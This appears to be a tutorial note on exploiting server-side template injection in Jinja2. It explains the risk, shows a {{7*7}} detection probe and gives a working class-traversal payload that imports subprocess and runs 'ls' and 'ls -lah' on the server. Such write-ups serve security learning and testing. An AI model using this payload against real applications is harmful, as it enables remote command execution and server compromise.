Jinja2 is a popular template engine for Python, renowned for its flexibility and performance. It is extensively used in web applications to render dynamic content, as it allows Python-like expressions to be embedded within HTML. While Jinja2 accelerates development and facilitates the separation of presentation from business logic, its powerful templating capabilities can also introduce significant security risks if not handled properly.

Since Jinja2 allows the execution of Python expressions within the templates, the security risk in Jinja2 often arises from insecure coding practices that allow user input to be executed within templates without proper sanitization. The vulnerability is not inherent in Jinja2 itself but rather in how developers handle user inputs in their templates. Properly sanitizing and validating all user inputs before incorporating them into templates is essential to prevent such security issues.

**Key Vulnerability Points:**
- **Expression Evaluation**: Jinja2 evaluates expressions within curly braces `{{ }}`, which can execute arbitrary Python code if crafted maliciously.
- **Template Inheritance and Imports**: Advanced features like template inheritance and macro imports can be misused to execute unintended code, leading to information disclosure or server manipulation.

## Exploitation
Inject a basic Jinja2 syntax like `{{7*7}}` to check for template processing. If the application returns 49, it indicates that Jinja2 is processing the template.
	![](Pasted%20image%2020250107021009.png)
Once Jinja2's use is confirmed, we can the use the payload:
```python
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```

- `"".__class__.__mro__[1]` accesses the base `object` class, the superclass of all Python classes.
- `__subclasses__()`: Lists all subclasses of `object`, and `[157]` is typically the index for the `subprocess.Popen` class (this index may vary and should be checked in the target environment).
	![](Pasted%20image%2020250107021243.png)
	![](Pasted%20image%2020250107021250.png)
- The subsequent method chains dynamically import and use the `subprocess` module to execute the `ls` command, capturing its output. 
	![](Pasted%20image%2020250107021350.png)

### Why check_output('ls -lah') Does Not Work
When you use `check_output('ls -lah')`, you're passing the entire command and its arguments as a single string. This is not the recommended way to use `check_output` because it does not parse the string into a command and separate arguments. Instead, it treats the whole string as a single command to execute, which it cannot resolve as a valid executable and thus fails to run.

This method of passing arguments can potentially lead to shell injection vulnerabilities if user-controlled strings are concatenated directly into the command string. By requiring commands and their arguments to be passed as a list, `check_output` minimizes this risk.

### check_output Usage
The `check_output` function is designed to enhance security by separating the command from its arguments, which helps to prevent shell injection attacks. Here's the general syntax:

```python
subprocess.check_output([command, arg1, arg2])
```

- **command**: A string that specifies the command to execute.
- **arg1, arg2, ...**: Additional arguments that should be passed to the command.

### Correct Usage of check_output
To properly execute the `ls` command with options using `check_output`, you should pass the command and its arguments as separate elements in a list:

```python
subprocess.check_output(['ls', '-lah'])
```

The list **['ls', '-lah']** contains the command `ls` and its argument `-lah`. The command is clearly separated from its arguments, which ensures that each part is correctly handled as intended. So the final payload will then be:

```python
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
```

![](Pasted%20image%2020250107021719.png)